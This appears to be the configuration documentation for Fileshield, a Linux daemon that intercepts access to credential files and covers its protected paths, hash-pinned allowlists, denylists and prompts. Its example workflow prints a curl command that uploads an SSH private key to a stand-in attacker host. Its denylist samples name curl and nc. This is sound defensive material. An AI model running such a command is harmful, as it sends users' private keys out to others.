# Configuration

Fileshield reads `/etc/fileshield.conf` on startup. The file is INI-style with five sections: `[protected_paths]`, `[allowlist]`, `[unsafe_allowlist]`, `[denylist]` and `[settings]`. The config must be root-owned and not writable by group or other. Unknown section headers refuse the whole config, so a typo cannot silently drop rules.

## Protected Paths

`[protected_paths]` controls which files and directories are watched. The default list ships in [`fileshield.conf`](../fileshield.conf) and is copied to `/etc/fileshield.conf` on first install. It covers common credential stores: shell histories, SSH and GPG keys, cloud CLIs (AWS, Azure, GCP, Cloudflare), Kubernetes and container registries, package-manager tokens, password managers, and AI coding agents.

Paths that do not exist yet are skipped at startup with a warning but remain covered by a mount mark — they are intercepted once created. The daemon refuses to start if `[protected_paths]` is empty or nothing can be marked.

### Glob Patterns

Entries may contain `*` and `**`:

```ini
~/.cloudflared/*.json
~/.cloudflared/**/*.json
~/.ssh/id_*
```

- `*` matches any characters **within one path segment** — never crosses `/`. Matches dotfiles (`.env.local` is covered by `~/.env*`).
- `**` matches **zero or more** whole segments: `~/.cloudflared/**/*.json` also matches `~/.cloudflared/a.json`. At most **one `**` per pattern** — a second is rejected at load (the matcher carries a single backtrack slot; silently under-matching would mean silently not protecting).
- Exact entries protect the directory and everything inside it. A **glob** entry matches only paths that fully match the pattern — use `~/.cloudflared/*` for direct children and `~/.cloudflared/**` for the whole subtree.
- A glob entry marks its wildcard-free base directory. A base that does not exist yet is skipped at startup and covered by a mount mark until it appears.
- `?`, `[`, `]` and `\` are literal characters; matching is case-sensitive.
- Comments start with `#` **only at the beginning of a line**. A `#` anywhere else is a literal path byte, and a pattern containing it would match nothing — the whole config is refused at load.

### Exclusions

A line starting with `!` is an exclusion:

```ini
~/.ssh/
!~/.ssh/*.pub
!~/.ssh/**/*.pub
```

- Exclusions **win over positives** regardless of config order.
- A path is protected if and only if a positive entry matches it and no exclusion does.
- Exclusion matching is path-based: a private key misnamed `*.pub` would be excluded too.
- An exclusions-only `[protected_paths]` refuses to start.

## Allowlist

`[allowlist]` rules are **hash-pinned**. The first matching access silently records the binary's SHA-512; every later access must match it.

```ini
[allowlist]
# Format: /absolute/path/to/binary = /path/to/target/file
# /usr/bin/ssh       = ~/.ssh/known_hosts
# /usr/bin/gpg       = ~/.gnupg/
# /usr/bin/opencode  = ~/.local/
```

- Either side may use `*` / `**` glob syntax.
- A **scoped** entry (`binary = target`) grants access to that one target. A **bare** entry (binary alone, no `=`) is a **global rule** — the binary may access _every_ protected path.
- A binary may appear on multiple lines with different targets.
- `~` in either side expands for every regular user's home (UID 1000–65533).

### Hash Pinning

The pin key is the rule's **canonical binary pattern** (the left-hand side after `~` expansion). The pinned value is the SHA-512 of the binary that first matched it.

- **First use**: digest recorded silently, access allowed. State file written immediately (atomically).
- **Matching pin**: allowed normally.
- **Changed hash**: a `kdialog` prompt shows the rule pattern, binary, old and new SHA-512, target and command. **Update & Allow** replaces the pin; **Deny** keeps the old pin.
- **Hash unavailable** (fork failure, timeout, binary under protected path): falls back to the normal dialog — never a silent grant.
- **Damaged pin file**: every `[allowlist]` match falls back to the prompt until the file is repaired or removed.

Pins live in `/var/lib/fileshield/allowlist-hashes.json` (mode 0600). The table holds at most **256 entries** (oldest evicted). Manage pins with [`fileshield-cli`](cli.md).

Because a glob rule pins the pattern itself, two different binaries matching the same rule **share one pin** — switching between them triggers the change prompt.

> **Upgrading from a pre-pinning config?** Existing `[allowlist]` entries keep working. Their first access pins the binary silently. After that, every in-place binary upgrade triggers one hash-change prompt.

## Unsafe Allowlist

`[unsafe_allowlist]` uses the same format but its hits are **never hash-checked or pinned**: a matching access is granted immediately. It is evaluated **before** `[allowlist]`.

Use it only for tools whose binary genuinely cannot be pinned — AppImages or tmp-mount tools that rebuild on every run:

```ini
[unsafe_allowlist]
# /tmp/.mount_*/openchamber = ~/.local/share/opencode/
```

### Handle with caution

Because an unsafe rule never checks the binary hash, it is only as narrow as its pattern. Any process that can create a path matching the rule and name its binary accordingly inherits the grant. Treat `[unsafe_allowlist]` as a deliberate hole:

- The **first** hit per process is logged at `WARNING` with the matched rule, binary, PID and target (repeats log at `INFO`).
- `notify_unsafe_allowlist` is **on by default**, raising a warning notification.
- If a warning or notification appears for a binary you did not launch, treat it as a security incident.

## Denylist

`[denylist]` uses the same format and glob syntax. Deny rules are **never hash-pinned or hash-checked** — a deny blocks the access no matter which binary matches.

```ini
[denylist]
# Format: /absolute/path/to/binary = /path/to/target/file
# /usr/bin/curl       = ~/.netrc
# /usr/bin/nc
```

**Denials are always evaluated first**: a config denylist hit produces `FAN_DENY` before any allowlist, cache, or session rule is consulted, and no dialog is shown.

## Settings

```ini
[settings]
# How long an "Allow Once" decision is cached (seconds).
# 0 disables caching. Shipped default: 300.
user_ttl = 300

# Cap for "Allow Session" / "Deny Session" (seconds).
# 0 = lives as long as the shell session.
session_ttl = 0

# Per-event debug logging. Off by default; -d/--debug enables it too.
debug = no

# Desktop notifications on config-rule hits.
notify_unsafe_allowlist = yes
notify_allowlist = no
notify_denylist = yes

# Identical (list, binary, target) notifications suppressed for this many seconds.
notify_dedup_ttl = 60

# Max notifications per 60-second window. Must be >= 1.
notify_max = 20
```

## Notifications

Fileshield can raise a desktop notification via `notify-send` when a **config rule** resolves an access (not for user dialog decisions):

| Setting                   | Default | Notifies on                                  |
| ------------------------- | ------- | -------------------------------------------- |
| `notify_unsafe_allowlist` | `yes`   | `[unsafe_allowlist]` grant                   |
| `notify_allowlist`        | `no`    | `[allowlist]` grant (pin match or first use) |
| `notify_denylist`         | `yes`   | `[denylist]` block                           |

A notification names the matched rule pattern, the concrete binary (PID and process name) and the target file:

```text
Fileshield: unsafe allowlist rule used
rule:   /tmp/.mount_*/openchamber
binary: /tmp/.mount_Ab3xY/openchamber (pid 4321, openchamber)
target: /home/user/.local/share/opencode/auth.json
```

Delivery is bounded by two settings:

- Identical `(list, binary, target)` hits are suppressed for `notify_dedup_ttl` seconds (default 60; `0` notifies every hit).
- `notify_max` (default 20) caps notifications per 60-second window.
- `[unsafe_allowlist]` notifications are gated **once per process**: first hit notifies, repeats log at `INFO` marked `(repeat)` without notifying. Another process is a new instance and surfaces again.

Notifications are best-effort: without a desktop session or `notify-send`, they are skipped and the access decision is unchanged. The journal remains the authoritative record.

## Example Workflow

When an unknown process (e.g., `curl` spawned from `/tmp`) tries to open `/home/user/.ssh/id_rsa`:

1. The kernel suspends the `open()` call.
2. A menu popup appears listing every scope as its own row, with the access details above it:

   ```text
   Process curl (PID 4521, parent: bash (PID 4518)) wants to read:

   Binary:   /tmp/curl
   Command:  curl -s https://evil.example.com --upload-file /home/user/.ssh/id_rsa
   Path:     /home/user/.ssh/id_rsa

   • Allow Once — this file and process, cached 300 seconds
   • Allow Session — this binary and file, until the requesting session ends
   • Allow Always — saved permanently for this command and file
   • Deny rows block with the same scopes
   Cancelling or closing this dialog, or any failure, denies this attempt only.
   ```

   The **Deny Once** row is preselected (`--default`): confirming without a deliberate selection — including an accidental Enter — denies this attempt.

   Each row pairs its scope name with a concise inline description. The decision is the selected row's tag read from stdout with a zero exit code — the only grant channel. Cancel, window close, timeout and all runtime errors produce no stdout and therefore **deny**.

3. **Deny** → `FAN_DENY` — the process receives `EPERM`, the file is never read.
4. **Allow Once** → `FAN_ALLOW` — cached for this process and file for `user_ttl` seconds.
5. **Allow Session** → `FAN_ALLOW` — this binary may read this file until the session leader exits (or `session_ttl` elapses).
6. **Allow Always** → `FAN_ALLOW` — a persistent rule bound to the binary hash, call chain, exact file and command line is created. See [Decision Scopes](decision-scopes.md).
